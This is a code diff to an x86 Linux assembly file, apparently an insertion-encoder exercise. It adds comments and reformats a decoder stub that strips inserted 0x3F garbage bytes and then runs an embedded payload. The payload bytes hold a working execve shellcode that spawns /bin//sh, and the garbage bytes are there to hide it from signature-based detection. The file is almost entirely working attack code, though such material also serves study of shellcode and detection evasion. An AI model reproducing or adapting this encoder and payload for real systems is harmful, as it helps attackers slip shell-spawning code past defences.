@@ -22,6 +22,11 @@
 ;
 ;   * decoder has 33 bytes (the final amount depends on the shellcode length plus garbage bytes)
 ;   * null-free
+;   * decodes any pattern of garbage insertion
+;       Eg.: True Byte = X, Garbage Byte = _
+;	     _ X _ X _ ...
+;	     X _ _ X X ...
+;	     X X X _ _ ... 
 ;
 ;
 ;   # nasm -f elf32 insertion_decoder.asm
@@ -52,13 +57,19 @@ decoder:
 	je short execve			; is shellcode's end? if yes, run it
 
 	inc ecx				; let's read the next byte in the next loop
- 	cmp bl, 0x3F			; compares with the garbage byte
-	je short decoder		; is an inserted garbage byte? so loop and try to find the correct one
+ 	cmp bl, 0x3F			; compares with the garbage byte (0x3F) AAS instruction
+					; 3F is the least used opcode as analyzed here http://z0mbie.host.sk/opcodes.html (I know that it's a PE)
 
-	mov byte [edi], bl		; when found, copy the correct byte to the garbage location
-	inc edi				; let's verify the next byte of the shellcode
+	je short decoder		; is an inserted garbage byte? so continue looping and trying to find the next one
+
+	mov byte [edi], bl		; when isn't garbage, copy the byte to the correct address
+	inc edi				; let's to set the next byte of the shellcode
 	jmp short decoder		; continue decoding
 
 getaddress:
 	call mainflow			; call back just to get the eip (address of the execve below)
-	execve: db 0x3F, 0x3F, 0x3F, 0x31, 0x3F, 0xc9, 0x3F, 0xf7, 0xe1, 0x3F, 0xb0, 0x0b, 0x3F, 0x51, 0x68, 0x3F, 0x2f, 0x2f, 0x3F, 0x73, 0x68, 0x3F, 0x68, 0x2f, 0x3F, 0x62, 0x69, 0x3F, 0x6e, 0x89, 0x3F, 0xe3, 0xcd, 0x3F, 0x80, 0xF1, 0xF1
+	execve: db 0x3F, 0x3F, 0x3F, 0x31, 0x3F, 0xc9, 0x3F, 0xf7, 0xe1, 0x3F
+		db 0xb0, 0x0b, 0x3F, 0x51, 0x68, 0x3F, 0x2f, 0x2f, 0x3F, 0x73
+		db 0x68, 0x3F, 0x68, 0x2f, 0x3F, 0x62, 0x69, 0x3F, 0x6e, 0x89
+		db 0x3F, 0xe3, 0xcd, 0x3F, 0x80
+		db 0xF1, 0xF1		; the two last bytes are the stop signature
